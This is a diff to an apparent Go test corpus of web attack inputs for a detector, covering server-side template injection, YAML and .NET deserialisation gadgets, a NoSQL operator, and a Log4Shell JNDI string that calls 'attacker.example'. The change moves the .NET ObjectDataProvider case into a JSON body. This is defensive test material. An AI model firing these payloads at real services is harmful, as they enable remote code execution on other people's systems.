@@ -176,15 +176,18 @@ var mythosCorpus = func() []mythCase {
 		{class: "ssti", name: "velocity evaluate", arg: "#evaluate($rce)", where: inArg, attack: true},
 		{class: "ssti", name: "jinja classic", arg: "{{7*7}}", where: inArg, attack: true},
 		{class: "ssti", name: "yaml python tag", where: inArg, attack: true,
-			arg:  "!!python/object/apply:os.system ['id']",
-			open: "no YAML parser; a deserialisation tag carries no grammar any detector reads"},
+			arg: "!!python/object/apply:os.system ['id']"},
 
 		// ---- deserialization --------------------------------------------------
 		{class: "deser", name: "java stream base64", arg: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA", where: inArg, attack: true},
 		{class: "deser", name: "log4shell jndi", arg: "${jndi:ldap://attacker.example/x}", where: inArg, attack: true},
-		{class: "deser", name: "dotnet type marker", where: inArg, attack: true,
-			arg:  "System.Windows.Data.ObjectDataProvider, PresentationFramework",
-			open: "typemarker isQualifiedClassName requires a backslash, so dotted .NET/Jackson names fall through"},
+		// The wire form carries the gadget class, not a bare dotted name: the
+		// class is what the gadget-class rule keys on, because a legitimate
+		// TypeNameHandling payload names the app's own type under the same
+		// "$type" key. ObjectDataProvider is the universal .NET RCE gadget.
+		{class: "deser", name: "dotnet type marker", where: inBody, attack: true,
+			body: []byte(`{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}`),
+			ct:   "application/json"},
 
 		// ---- nosql -------------------------------------------------------------
 		{class: "nosql", name: "where operator", arg: "q[$where]", where: inRawArg, attack: true},
